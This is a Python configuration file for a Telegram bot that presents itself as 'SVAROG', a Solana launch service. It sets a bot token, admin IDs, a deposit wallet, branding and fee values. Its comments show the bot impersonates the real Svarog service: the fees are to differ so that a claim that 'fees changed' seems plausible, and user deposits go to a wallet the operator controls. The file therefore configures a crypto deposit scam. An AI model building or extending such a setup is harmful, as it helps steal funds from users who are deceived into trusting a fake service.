import os
from pathlib import Path

from dotenv import load_dotenv

load_dotenv(Path(__file__).with_name(".env"))

# ─── EDIT EVERYTHING IN THIS FILE ───────────────────────────────────────

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
if not BOT_TOKEN:
    raise RuntimeError("Set BOT_TOKEN in svarog/.env or the process environment.")

# Your Telegram numeric ID (get it from @userinfobot). Admins see /admin.
_admin_ids = os.environ.get("ADMIN_IDS", "").strip()
if _admin_ids.startswith("[") != _admin_ids.endswith("]"):
    raise RuntimeError("ADMIN_IDS must be numeric IDs separated by commas, with optional surrounding brackets.")
if _admin_ids.startswith("["):
    _admin_ids = _admin_ids[1:-1]
try:
    ADMIN_IDS = [int(value.strip()) for value in _admin_ids.split(",") if value.strip()]
except ValueError as exc:
    raise RuntimeError("ADMIN_IDS must contain numeric IDs separated by commas.") from exc
if not ADMIN_IDS:
    raise RuntimeError("Set at least one numeric ADMIN_IDS value in svarog/.env.")

# WHERE THE MONEY GOES. A Solana address you control. NOT an exchange
# deposit address (they rotate). Use a fresh Phantom wallet you own.
DEPOSIT_ADDRESS = os.environ.get("DEPOSIT_ADDRESS", "PUT_YOUR_SOLANA_ADDRESS_HERE")

# Branding
BRAND = "SVAROG"
TAGLINE = "Solana launch infrastructure"
SUPPORT = "@svarog_support"
CHANNEL = ""          # leave "" to hide the join gate
DOCS_URL = "https://telegra.ph/..."  # a telegra.ph page you write
SITE_URL = "svaroglauncher.com"

# Economics (keep these DIFFERENT from real Svarog so "fees changed" is plausible)
SOL_USD = 190.0
MIN_DEPOSIT = 0.02
LAUNCH_FEE = 0.02                  # charged from balance
BUNDLE_WALLET_FEE = 0.004          # per burner wallet
WITHDRAW_MIN = 0.05
WITHDRAW_FEE = 0.002
DEV_BUY_MAX = 20.0

# Live deposit detection (credits deposits automatically). Set False to
# credit manually from /admin.
LIVE_DETECTION = True
RPC_URL = os.environ.get("RPC_URL", "https://api.mainnet-beta.solana.com")

DB_PATH = "svarog.db"
